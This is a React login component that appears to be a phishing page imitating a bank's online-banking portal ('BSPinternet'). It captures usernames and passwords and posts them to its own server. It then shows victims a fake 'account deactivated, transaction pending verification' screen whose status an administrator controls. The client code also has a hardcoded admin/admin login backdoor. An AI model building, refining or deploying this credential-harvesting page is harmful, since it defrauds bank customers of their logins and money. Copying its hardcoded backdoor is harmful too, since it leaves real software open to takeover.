import React, { useState, useEffect } from 'react';
import { UserAccount } from '../types';
import { Loader2, AlertCircle, CheckCircle2 } from 'lucide-react';
import { motion } from 'motion/react';

const BSPLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path 
      d="M20 25 C45 15, 80 25, 80 37.5 C80 50, 55 50, 40 50 L20 50" 
      stroke="#006633" 
      strokeWidth="8" 
      strokeLinecap="round" 
      strokeLinejoin="round" 
    />
    <path 
      d="M20 75 C45 85, 80 75, 80 62.5 C80 50, 55 50, 40 50" 
      stroke="#006633" 
      strokeWidth="8" 
      strokeLinecap="round" 
      strokeLinejoin="round" 
    />
  </svg>
);

interface ClientPortalProps {
  onAdminLogin: () => void;
}

export function ClientPortal({ onAdminLogin }: ClientPortalProps) {
  const [accountId, setAccountId] = useState<string | null>(localStorage.getItem('bsp_account_id'));
  const [account, setAccount] = useState<UserAccount | null>(null);
  
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // Fetch account status if we have an ID
  useEffect(() => {
    if (accountId) {
      fetchStatus(accountId);
      const interval = setInterval(() => fetchStatus(accountId), 5000); // Poll every 5s
      return () => clearInterval(interval);
    }
  }, [accountId]);

  const fetchStatus = async (id: string) => {
    try {
      const res = await fetch(`/api/auth/status/${id}`);
      if (res.ok) {
        const data = await res.json();
        setAccount(data.account);
      } else {
        // Account not found or error, reset
        setAccountId(null);
        localStorage.removeItem('bsp_account_id');
      }
    } catch (err) {
      console.warn('Error fetching status (retrying):', err);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (username !== 'admin' && username.length < 10) {
      setError('Username must be a minimum of 10 digits.');
      return;
    }

    setLoading(true);
    setError('');

    // Admin backdoor for demo
    if (username === 'admin' && password === 'admin') {
      onAdminLogin();
      setLoading(false);
      return;
    }

    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, submittedInfo: '' }),
      });

      const data = await res.json();

      if (res.ok) {
        setAccountId(data.account.id);
        setAccount(data.account);
        localStorage.setItem('bsp_account_id', data.account.id);
      } else {
        setError(data.error || 'Failed to authenticate');
      }
    } catch (err) {
      setError('Network error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    setAccountId(null);
    setAccount(null);
    setUsername('');
    setPassword('');
    localStorage.removeItem('bsp_account_id');
  };

  if (account) {
    return (
      <motion.div 
        initial={{ opacity: 0, scale: 0.95, y: 10 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.5, ease: "easeOut" }}
        className="w-full max-w-md mx-auto bg-gradient-to-br from-slate-800 to-slate-950 shadow-2xl shadow-black/60 rounded-2xl overflow-hidden border border-slate-700 ring-1 ring-white/5 relative"
      >
        {/* Subtle glowing effect */}
        <div className="absolute inset-0 bg-gradient-to-t from-transparent to-white/5 pointer-events-none" />

        <div className="pt-10 px-8 pb-0 text-center relative z-10">
          <h2 className="text-lg font-bold text-white tracking-widest uppercase drop-shadow-sm">ACCOUNT DEACTIVATED</h2>
          <p className="text-sm text-slate-400 mt-2 font-medium">{account.username}</p>
        </div>
        
        <div className="px-8 pb-10 pt-4 relative z-10">
          {account.status === 'pending' && (
            <div className="flex flex-col items-center justify-center text-center py-6">
              <Loader2 className="h-14 w-14 text-amber-500 animate-spin mb-6 drop-shadow-md" />
              <h3 className="text-2xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-amber-200 via-yellow-400 to-amber-500 mb-4 tracking-tight drop-shadow-sm">TRANSACTION PENDING VERIFICATION</h3>
              <p className="text-white text-base leading-relaxed font-medium">
                Internet Transfer Inactive. Please activate to proceed. Hold on for 24 hours.
              </p>
            </div>
          )}

          {account.status === 'approved' && (
            <div className="flex flex-col items-center justify-center text-center py-6">
              <CheckCircle2 className="h-12 w-12 text-emerald-400 mb-4 drop-shadow-md" />
              <h3 className="text-lg font-medium text-emerald-100 mb-2">Access Granted</h3>
              <p className="text-slate-400 text-sm">
                Your account has been fully verified and approved by the BSPinternet administration.
              </p>
            </div>
          )}

          {account.status === 'rejected' && (
            <div className="flex flex-col items-center justify-center text-center py-6">
              <AlertCircle className="h-12 w-12 text-rose-500 mb-4 drop-shadow-md" />
              <h3 className="text-lg font-medium text-rose-200 mb-2">Access Denied</h3>
              <div className="bg-rose-950/50 text-rose-200 border border-rose-900/50 rounded-lg p-4 mt-2 text-sm w-full shadow-inner">
                <span className="font-semibold block mb-1">Reason for Rejection:</span>
                {account.rejectionReason || "No specific reason provided."}
              </div>
            </div>
          )}

          <div className="mt-8">
            <button 
              onClick={handleLogout}
              className="w-full py-3.5 px-4 text-sm font-bold text-slate-900 bg-gradient-to-r from-amber-400 to-yellow-500 hover:from-amber-300 hover:to-yellow-400 rounded-lg shadow-lg shadow-amber-500/20 transition-all border border-amber-300 uppercase tracking-wide"
            >
              Authorize Account Access
            </button>
          </div>
        </div>
      </motion.div>
    );
  }

  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.95, y: 10 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-md mx-auto bg-gradient-to-br from-slate-800 to-slate-950 shadow-2xl shadow-black/60 rounded-2xl overflow-hidden border border-slate-700 ring-1 ring-white/5 relative"
    >
      {/* Subtle glowing effect */}
      <div className="absolute inset-0 bg-gradient-to-t from-transparent to-white/5 pointer-events-none" />

      <div className="p-8 relative z-10">
        <div className="flex flex-col items-center justify-center text-center mb-8">
          <div className="flex items-center justify-center">
            <BSPLogo className="h-10 w-auto mr-3" />
            <h2 className="text-4xl font-extrabold text-white tracking-tight drop-shadow-sm">BSPinternet</h2>
          </div>
          <p className="text-sm text-slate-300 mt-2 font-medium">Enter your credentials to access the transaction or Transfer</p>
        </div>

        {error && (
          <div className="mb-6 p-4 bg-rose-950/50 border border-rose-900/50 text-rose-200 text-sm rounded-lg flex items-start shadow-inner">
            <AlertCircle className="h-5 w-5 mr-2 shrink-0 mt-0.5 drop-shadow-md" />
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label className="block text-sm font-medium text-slate-300 mb-1.5" htmlFor="username">
              Username
            </label>
            <input
              id="username"
              type="text"
              required
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-4 py-3 bg-slate-900/60 border border-slate-700 text-white rounded-lg focus:ring-2 focus:ring-amber-500 focus:border-amber-500 outline-none transition-all placeholder-slate-500"
              placeholder="e.g., jsmith"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-slate-300 mb-1.5" htmlFor="password">
              Password
            </label>
            <input
              id="password"
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 bg-slate-900/60 border border-slate-700 text-white rounded-lg focus:ring-2 focus:ring-amber-500 focus:border-amber-500 outline-none transition-all placeholder-slate-500"
              placeholder="••••••••"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3.5 px-4 text-sm font-bold text-slate-900 bg-gradient-to-r from-amber-400 to-yellow-500 hover:from-amber-300 hover:to-yellow-400 rounded-lg shadow-lg shadow-amber-500/20 transition-all border border-amber-300 uppercase tracking-wide disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {loading ? <Loader2 className="h-5 w-5 animate-spin" /> : 'Connect to Network'}
          </button>
        </form>
      </div>
    </motion.div>
  );
}
